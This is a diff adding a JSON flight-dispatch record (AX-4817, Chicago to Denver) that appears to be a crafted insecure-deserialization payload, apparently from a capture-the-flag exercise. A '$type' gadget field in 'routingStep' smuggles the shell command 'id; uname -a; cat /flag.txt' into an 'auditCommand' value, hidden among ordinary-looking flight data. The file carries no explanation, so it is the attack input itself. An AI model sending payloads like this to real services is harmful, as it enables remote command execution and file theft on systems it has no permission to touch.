@@ -1,0 +1,22 @@
+{
+  "flightNumber": "AX-4817",
+  "tailNumber": "N742AX",
+  "dispatcher": "morgan.lee",
+  "origin": "KORD",
+  "destination": "KDEN",
+  "scheduledDeparture": "2026-06-08T21:35:00Z",
+  "routingStep": {
+    "$type": "AeroOps.Workflow.RouteAuditStep, AeroOps.Workflow",
+    "auditCommand": "id; uname -a; cat /flag.txt",
+    "reportName": "release-audit.txt",
+    "timeoutSeconds": 3
+  },
+  "legs": [
+    {
+      "from": "KORD",
+      "to": "KDEN",
+      "alternates": "KCOS,KPUB",
+      "reserveMinutes": 48
+    }
+  ]
+}
